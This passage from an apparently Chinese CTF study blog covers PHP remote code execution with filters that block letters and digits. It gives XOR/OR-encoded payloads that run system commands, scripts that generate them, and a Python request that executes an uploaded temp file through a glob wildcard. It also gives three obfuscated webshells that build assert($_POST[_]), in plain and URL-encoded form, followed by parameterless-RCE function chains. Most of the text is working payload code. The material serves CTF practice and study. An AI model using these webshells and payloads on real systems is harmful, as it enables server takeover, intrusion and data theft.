//system(whoami)(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%0c%08&quot;^&quot;%60%7b&quot;);  //system(ls)(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%03%01%08%00%00%06%0c%01%07&quot;^&quot;%60%60%7c%20%2f%60%60%60%60&quot;); //system(cat /flag)</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121201250221.png" alt="image-20221121201250221"></p><h2 id="二进制或绕过"><a href="#二进制或绕过" class="headerlink" title="二进制或绕过"></a>二进制或绕过</h2><p>php7</p><p>原理是一样的，只需要在上面的脚本上稍加改动即可</p><p>or.php</p><pre><code class="php">&lt;?php/* author yu22x */$myfile = fopen(&quot;or_rce.txt&quot;, &quot;w&quot;);$contents=&quot;&quot;;for ($i=0; $i &lt; 256; $i++) &#123;     for ($j=0; $j &lt;256 ; $j++) &#123;         if($i&lt;16)&#123;            $hex_i=&#39;0&#39;.dechex($i);        &#125;        else&#123;            $hex_i=dechex($i);        &#125;        if($j&lt;16)&#123;            $hex_j=&#39;0&#39;.dechex($j);        &#125;        else&#123;            $hex_j=dechex($j);        &#125;        $preg = &#39;/[0-9a-z]/i&#39;;//根据题目给的正则表达式修改即可        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;                    echo &quot;&quot;;    &#125;          else&#123;        $a=&#39;%&#39;.$hex_i;        $b=&#39;%&#39;.$hex_j;        $c=(urldecode($a)|urldecode($b));        if (ord($c)&gt;=32&amp;ord($c)&lt;=126) &#123;            $contents=$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\n&quot;;        &#125;    &#125;&#125;&#125;fwrite($myfile,$contents);fclose($myfile);</code></pre><p>or.py</p><pre><code class="python"># -*- coding: utf-8 -*-# author yu22ximport requestsimport urllibfrom sys import *import osdef action(arg):   s1=&quot;&quot;   s2=&quot;&quot;   for i in arg:       f=open(&quot;or_rce.txt&quot;,&quot;r&quot;)       while True:           t=f.readline()           if t==&quot;&quot;:               break           if t[0]==i:               #print(i)               s1+=t[2:5]               s2+=t[6:9]               break       f.close()   output=&quot;(\&quot;&quot;+s1+&quot;\&quot;|\&quot;&quot;+s2+&quot;\&quot;)&quot;   return(output)   while True:   param=action(input(&quot;\n[+] your function：&quot;) )+action(input(&quot;[+] your command：&quot;))+&quot;;&quot;   print(param)</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121203834452.png" alt="image-20221121203834452"></p><pre><code>(&quot;%10%08%10%09%0e%06%0f&quot;|&quot;%60%60%60%60%60%60%60&quot;)();  //phpinfo()(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%17%08%0f%01%0d%09&quot;|&quot;%60%60%60%60%60%60&quot;);  //system(whoami)(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%0c%13&quot;|&quot;%60%60&quot;);   //system(ls)(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%03%01%14%00%00%06%0c%01%07&quot;|&quot;%60%60%60%20%2f%60%60%60%60&quot;); //cat /flag</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121204056924.png" alt="image-20221121204056924"></p><h2 id="上传临时文件"><a href="#上传临时文件" class="headerlink" title="上传临时文件"></a>上传临时文件</h2><p><code>.</code>或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则<code>. file</code>的意思就是用bash执行file文件中的命令。</p><p>用<code>. file</code>执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，那不就可以利用<code>.</code>来执行它了吗？</p><p>这个文件也很好得到，我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是<code>/tmp/phpXXXXXX</code>，文件名最后6个字符是随机的大小写字母。</p><p>第二个难题接踵而至，执行<code>. /tmp/phpXXXXXX</code>，也是有字母的。此时就可以用到Linux下的glob通配符：</p><ul><li><code>*</code>可以代替0个及以上任意字符</li><li><code>?</code>可以代表1个任意字符</li></ul><p>那么，<code>/tmp/phpXXXXXX</code>就可以表示为<code>/*/?????????</code>或<code>/???/?????????</code>。</p><p>但我们尝试执行<code>. /???/?????????</code>，却得到如下错误：</p><p><a href="https://www.leavesongs.com/media/attachment/2018/10/06/19ba62d6-9f8a-40a6-a3f9-833deca218d5.png"><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/19ba62d6-9f8a-40a6-a3f9-833deca218d5.1d1534b39994.png" alt="image.png"></a></p><p>这是因为，能够匹配上<code>/???/?????????</code>这个通配符的文件有很多，我们可以列出来：</p><p><a href="https://www.leavesongs.com/media/attachment/2018/10/06/67a4aab1-9e90-43e6-b3f1-3569c7009390.png"><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/67a4aab1-9e90-43e6-b3f1-3569c7009390.423d9ca7066c.png" alt="image.png"></a></p><p>可见，我们要执行的<code>/tmp/phpcjggLC</code>排在倒数第二位。然而，在执行第一个匹配上的文件（即<code>/bin/run-parts</code>）的时候就已经出现了错误，导致整个流程停止，根本不会执行到我们上传的文件。</p><p>思路又陷入了僵局，虽然方向没错。</p><p><strong>深入理解glob通配符</strong></p><p>大部分同学对于通配符，可能知道的都只有<code>*</code>和<code>?</code>。但实际上，阅读Linux的文档（ <a href="http://man7.org/linux/man-pages/man7/glob.7.html">http://man7.org/linux/man-pages/man7/glob.7.html</a> ），可以学到更多有趣的知识点。</p><p>其中，glob支持用<code>[^x]</code>的方法来构造“这个位置不是字符x”。那么，我们用这个姿势干掉<code>/bin/run-parts</code>：</p><p><a href="https://www.leavesongs.com/media/attachment/2018/10/06/0a5b0800-1a01-4738-831f-f597795255e0.png"><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/0a5b0800-1a01-4738-831f-f597795255e0.63b17aebf66d.png" alt="image.png"></a></p><p>排除了第4个字符是<code>-</code>的文件，同样我们可以排除包含<code>.</code>的文件：</p><p><a href="https://www.leavesongs.com/media/attachment/2018/10/06/1553332a-76fe-4a0a-a8db-7f1ae410c85c.png"><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/1553332a-76fe-4a0a-a8db-7f1ae410c85c.4bb210f52740.png" alt="image.png"></a></p><p>现在就剩最后三个文件了。但我们要执行的文件仍然排在最后，但我发现这三个文件名中都不包含特殊字符，那么这个方法似乎行不通了。</p><p>继续阅读glob的帮助，我发现另一个有趣的用法：</p><p><a href="https://www.leavesongs.com/media/attachment/2018/10/06/1bbd6606-f2bc-4b7d-8374-a8e501e0b93a.png"><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/1bbd6606-f2bc-4b7d-8374-a8e501e0b93a.3c485a5bb8eb.png" alt="image.png"></a></p><p>就跟正则表达式类似，glob支持利用<code>[0-9]</code>来表示一个范围。</p><p>我们再来看看之前列出可能干扰我们的文件：</p><p><a href="https://www.leavesongs.com/media/attachment/2018/10/06/ee9e5ae9-3937-46a3-8d8e-1f4879913801.png"><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/ee9e5ae9-3937-46a3-8d8e-1f4879913801.f9e468b3ba6e.png" alt="image.png"></a></p><p>所有文件名都是小写，只有PHP生成的临时文件包含大写字母。那么答案就呼之欲出了，我们只要找到一个可以表示“大写字母”的glob通配符，就能精准找到我们要执行的文件。</p><p>翻开ascii码表，可见大写字母位于<code>@</code>与<code>[</code>之间：</p><p><a href="https://www.leavesongs.com/media/attachment/2018/10/06/a827f363-7520-4fe9-aac1-b8ceba21a1f3.png"><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/a827f363-7520-4fe9-aac1-b8ceba21a1f3.5be5b8cfbacc.png" alt="image.png"></a></p><p>那么，我们可以利用<code>[@-[]</code>来表示大写字母：</p><p><a href="https://www.leavesongs.com/media/attachment/2018/10/06/42774646-968e-4e11-b6fa-5d4e83eb3c4c.png"><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/42774646-968e-4e11-b6fa-5d4e83eb3c4c.99f26e97fa8a.png" alt="image.png"></a></p><p>显然这一招是管用的。</p><p>当然，php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。</p><p>最后，我传入的code为<code>?&gt;&lt;?=</code>. /???/????????[@-[]<code>;?&gt;</code>，发送数据包如下：</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121212607216.png" alt="image-20221121212607216"></p><p>可写一个脚本:</p><pre><code class="python">#coding:utf-8#author yu22ximport requestsurl=&quot;http://xxx/test.php?code=?&gt;&lt;?=`. /???/????????[@-[]`;?&gt;&quot;files=&#123;&#39;file&#39;:&#39;cat f*&#39;&#125;response=requests.post(url,files=files)html = response.textprint(html)</code></pre><h2 id="构造无数字字母webshell"><a href="#构造无数字字母webshell" class="headerlink" title="构造无数字字母webshell"></a>构造无数字字母webshell</h2><p>环境:php5</p><p>php5中assert是一个函数，我们可以通过<code>$f=&#39;assert&#39;;$f(...);</code>这样的方法来动态执行任意代码。</p><p>但php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用file_put_contents函数，同样可以用来getshell。</p><p>下文为了方便起见，使用PHP5作为环境</p><h3 id="异或webshell"><a href="#异或webshell" class="headerlink" title="异或webshell"></a>异或webshell</h3><p>这是最简单、最容易想到的方法。在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。</p><p>得到如下的结果（因为其中存在很多不可打印字符，所以我用url编码表示了）：</p><pre><code class="php">&lt;?php$_=(&#39;%01&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%05&#39;^&#39;`&#39;).(&#39;%12&#39;^&#39;`&#39;).(&#39;%14&#39;^&#39;`&#39;); // $_=&#39;assert&#39;;$__=&#39;_&#39;.(&#39;%0D&#39;^&#39;]&#39;).(&#39;%2F&#39;^&#39;`&#39;).(&#39;%0E&#39;^&#39;]&#39;).(&#39;%09&#39;^&#39;]&#39;); // $__=&#39;_POST&#39;;$___=$$__;$_($___[_]); // assert($_POST[_]);</code></pre><p>传入代码:</p><pre><code>$_=(&#39;%01&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%05&#39;^&#39;`&#39;).(&#39;%12&#39;^&#39;`&#39;).(&#39;%14&#39;^&#39;`&#39;);$__=&#39;_&#39;.(&#39;%0D&#39;^&#39;]&#39;).(&#39;%2F&#39;^&#39;`&#39;).(&#39;%0E&#39;^&#39;]&#39;).(&#39;%09&#39;^&#39;]&#39;);$___=$$__;$_($___[_]);</code></pre><p>执行结果如下：</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121214114436.png" alt="image-20221121214114436"></p><h3 id="取反webshell"><a href="#取反webshell" class="headerlink" title="取反webshell"></a>取反webshell</h3><p>用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如<code>&#39;和&#39;&#123;2&#125;</code>的结果是<code>&quot;\x8c&quot;</code>，其取反即为字母<code>s</code>：</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121214447649.png" alt="image-20221121214447649"></p><p>可构造出webshell</p><pre><code class="php">&lt;?php$__=(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;);$_=$__/$__;$____=&#39;&#39;;$___=&quot;瞰&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;的&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;半&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;始&quot;;$____.=~($___&#123;$__&#125;);$_____=&#39;_&#39;;$___=&quot;俯&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;瞰&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;次&quot;;$_____.=~($___&#123;$_&#125;);$___=&quot;站&quot;;$_____.=~($___&#123;$_&#125;);$_=$$_____;$____($_[$__]);</code></pre><p>直接传入:</p><pre><code class="php">$__=(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;);$_=$__/$__;$____=&#39;&#39;;$___=&quot;瞰&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;的&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;半&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;始&quot;;$____.=~($___&#123;$__&#125;);$_____=&#39;_&#39;;$___=&quot;俯&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;瞰&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;次&quot;;$_____.=~($___&#123;$_&#125;);$___=&quot;站&quot;;$_____.=~($___&#123;$_&#125;);$_=$$_____;$____($_[$__]);</code></pre><p>使用时候进行下url编码</p><pre><code class="php">%24__%3d(&#39;%3e&#39;%3e&#39;%3c&#39;)%2b(&#39;%3e&#39;%3e&#39;%3c&#39;)%3b%24_%3d%24__%2f%24__%3b%24____%3d&#39;&#39;%3b%24___%3d%22%e7%9e%b0%22%3b%24____.%3d~(%24___%7b%24_%7d)%3b%24___%3d%22%e5%92%8c%22%3b%24____.%3d~(%24___%7b%24__%7d)%3b%24___%3d%22%e5%92%8c%22%3b%24____.%3d~(%24___%7b%24__%7d)%3b%24___%3d%22%e7%9a%84%22%3b%24____.%3d~(%24___%7b%24_%7d)%3b%24___%3d%22%e5%8d%8a%22%3b%24____.%3d~(%24___%7b%24_%7d)%3b%24___%3d%22%e5%a7%8b%22%3b%24____.%3d~(%24___%7b%24__%7d)%3b%24_____%3d&#39;_&#39;%3b%24___%3d%22%e4%bf%af%22%3b%24_____.%3d~(%24___%7b%24__%7d)%3b%24___%3d%22%e7%9e%b0%22%3b%24_____.%3d~(%24___%7b%24__%7d)%3b%24___%3d%22%e6%ac%a1%22%3b%24_____.%3d~(%24___%7b%24_%7d)%3b%24___%3d%22%e7%ab%99%22%3b%24_____.%3d~(%24___%7b%24_%7d)%3b%24_%3d%24%24_____%3b%24____(%24_%5b%24__%5d)%3b</code></pre><p>这个答案还利用了PHP的弱类型特性。因为要获取<code>&#39;和&#39;&#123;2&#125;</code>，就必须有数字2。而PHP由于弱类型这个特性，true的值为1，故<code>true+true==2</code>，也就是<code>(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)==2</code>。</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121220150735.png" alt="image-20221121220150735"></p><h3 id="自增webshell"><a href="#自增webshell" class="headerlink" title="自增webshell"></a>自增webshell</h3><p>7.0.12以上版本不可使用</p><p>那么，如果不用位运算这个套路，能不能搞定这题呢？有何不可。</p><p>这就得借助PHP的一个小技巧，先看文档： <a href="http://php.net/manual/zh/language.operators.increment.php">http://php.net/manual/zh/language.operators.increment.php</a></p><p><a href="https://www.leavesongs.com/media/attachment/2017/02/17/a386505b-1c14-48f0-88cb-66923770df33.jpg"><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/a386505b-1c14-48f0-88cb-66923770df33.8732f996cd67.jpg" alt="14872693882387.jpg"></a></p><p>也就是说，<code>&#39;a&#39;++ =&gt; &#39;b&#39;</code>，<code>&#39;b&#39;++ =&gt; &#39;c&#39;</code>… 所以，我们只要能拿到一个变量，其值为<code>a</code>，通过自增操作即可获得a-z中所有字符。</p><p>那么，如何拿到一个值为字符串’a’的变量呢？</p><p>巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。</p><p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为<code>Array</code>：</p><p><a href="https://www.leavesongs.com/media/attachment/2017/02/17/4d0c6bc9-5417-41b2-91ca-4e110e8d1350.jpg"><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/4d0c6bc9-5417-41b2-91ca-4e110e8d1350.72f524026162.jpg" alt="14872697183159.jpg"></a></p><p>再取这个字符串的第一个字母，就可以获得’A’了。</p><p>利用这个技巧，我编写了如下webshell（因为PHP函数是大小写不敏感的，所以我们最终执行的是<code>ASSERT($_POST[_])</code>，无需获取小写a）：</p><pre><code class="php">&lt;?php$_=[];$_=@&quot;$_&quot;; // $_=&#39;Array&#39;;$_=$_[&#39;!&#39;==&#39;@&#39;]; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____=&#39;_&#39;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;$___($_[_]); // ASSERT($_POST[_]);</code></pre><p>可直接传入</p><pre><code class="php">//测试发现7.0.12以上版本不可使用//使用时需要url编码下$_=[];$_=@&quot;$_&quot;;$_=$_[&#39;!&#39;==&#39;@&#39;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#39;_&#39;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);固定格式 构造出来的 assert($_POST[_]);url编码后再使用%24_%3d%5b%5d%3b%24_%3d%40%22%24_%22%3b%24_%3d%24_%5b&#39;!&#39;%3d%3d&#39;%40&#39;%5d%3b%24___%3d%24_%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24____%3d&#39;_&#39;%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24_%3d%24%24____%3b%24___(%24_%5b_%5d)%3b然后post传入   _=phpinfo();</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121210330927.png" alt="image-20221121210330927"></p><h1 id="无参数rce"><a href="#无参数rce" class="headerlink" title="无参数rce"></a>无参数rce</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>无参数RCE，其实就是通过<strong>没有参数的函数</strong>达到命令执行的目的。<br> <strong>没有参数的函数</strong>什么意思？一般该类题目代码如下(或类似)：</p><pre><code class="php">&lt;?phphighlight_file(__FILE__);error_reporting(0);header(&quot;Content-Type: text/html; charset=utf-8&quot;);if(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &#123;    eval($_GET[&#39;code&#39;]);&#125;</code></pre><p>先来解读下代码：</p><pre><code>如果&#39;;&#39;===preg_replace(...)，那么就执行exp传递的命令\ : 转义字符不多说了[a-z,_]+ : [a-z,_]匹配小写字母和下划线 +表示1到多个(?R)? : (?R)代表当前表达式，就是这个(/[a-z,_]+((?R)?)/)，所以会一直递归，?表示递归当前表达式0次或1次（若是(?R)*则表示递归当前表达式0次或多次，例如它可以匹配a(b(c()d()))）</code></pre><p>简单说来就是：这串代码检查了我们通过GET方式传入的exp参数的值，如果传进去的值是传进去的值是字符串接一个()，那么字符串就会被替换为空。如果（递归）替换后的字符串只剩下;,那么我们传进去的 exp 就会被 eval 执行。比如我们传入一个 phpinfo();，它被替换后就只剩下;，那么根据判断条件就会执行phpinfo();。</p><p>(?R)?能匹配的只有a(); a(b()); a(b(c()));这种类型的。比如传入a(b(c()));，第一次匹配后，就剩a(b());，第二次匹配后，a();，第三次匹配后就只剩下;了，最后a(b(c()));就会被eval执行。</p><h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><p>先来整理下经常需要用到的函数吧，后面会说具体使用:</p><pre><code class="php">目录操作:getchwd() //函数返回当前工作目录。scandir() //函数返回指定目录中的文件和目录的数组。dirname() //函数返回路径中的目录部分。chdir() //函数改变当前的目录。数组操作:pos()     //current() 的别名reset()  //将数组的内部指针指向第一个单元end()     //将内部指针指向数组中的最后一个元素，并输出。next() //函数将内部指针指向数组中的下一个元素，并输出。prev()  //将数组内部指针倒回一位。each()  //返回当前元素的键名和键值，并将内部指针向前移动array_reverse()以相反的元素顺序返回数组。array_rand() 函数返回数组中的随机键名(也就是下标)，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。array_flip() array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。array_slice() 函数在数组中根据条件取出一段值，并返回。    读取文件操作:readfile() //输出一个文件。readgzfile()show_source()highlight_file()   //打印输出或者返回 filename 文件中语法高亮版本的代码。file_get_contents ()    其它函数:localeconv() 函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是.current() 返回数组中的当前单元, 默认取第一个值。current(localeconv())永远都是个点chr() 函数从指定的 ASCII 值返回字符。hex2bin() — 转换十六进制字符串为二进制字符串。getenv() 获取一个环境变量的值(在7.1之后可以不给予参数)。localeconv() 函数返回一包含本地数字及货币格式信息的数组。    phpversion()返回php版本，如7.3.5floor(phpversion())返回7sqrt(floor(phpversion()))返回2.6457513110646tan(floor(sqrt(floor(phpversion()))))返回-2.1850398632615cosh(tan(floor(sqrt(floor(phpversion())))))返回4.5017381103491sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))返回45.081318677156ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))返回46chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))返回.var_dump(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))扫描当前目录next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))返回..//floor()：舍去法取整，sqrt()：平方根，tan()：正切值，cosh()：双曲余弦，sinh()：双曲正弦，ceil()：进一法取整    chr(ord(hebrevc(crypt(phpversion()))))`返回`.  //hebrevc(crypt(arg))可以随机生成一个hash值 第一个字符随机是 $(大概率) 或者 .(小概率) 然后通过ord chr只取第一个字符//crypt()：单向字符串散列，返回散列后的字符串或一个少于 13 字符的字符串，从而保证在失败时与盐值区分开来。//hebrevc()：将逻辑顺序希伯来文（logical-Hebrew）转换为视觉顺序希伯来文（visual-Hebrew），并且转换换行符，返回视觉顺序字符串。</code></pre><h2 id="dirname-amp-chdir"><a href="#dirname-amp-chdir" class="headerlink" title="dirname() &amp; chdir()"></a>dirname() &amp; chdir()</h2><p>这个方法并不可以rce，只是可以完成读取文件的操作，事实上在很多情况下已经够用了</p><p>想读文件，就必须进行目录遍历，没有参数，怎么进行目录遍历呢？<br>首先，我们可以利用<code>getcwd()</code>获取当前目录</p><pre><code class="php">var_dump(getcwd());</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122174021764.png" alt="image-20221122174021764"></p><p>那么怎么进行当前目录的目录遍历呢？<br>这里用<code>scandir()</code>即可</p><pre><code class="php">var_dump(scandir(getcwd()));</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122174107093.png" alt="image-20221122174107093"></p><p>如果getcwd()无法使用呢?</p><p>我们知道localeconv()返回一包含本地数字及货币格式信息的数组。而数组第一项就是<code>.</code></p><p>我们可构造出:</p><pre><code class="php">var_dump(scandir(current(localeconv())));  //var_dump也可以用print_r代替var_dump(scandir(pos(localeconv())));var_dump(scandir(reset(localeconv())));var_dump(scandir(chr(current(localtime(time()))))); 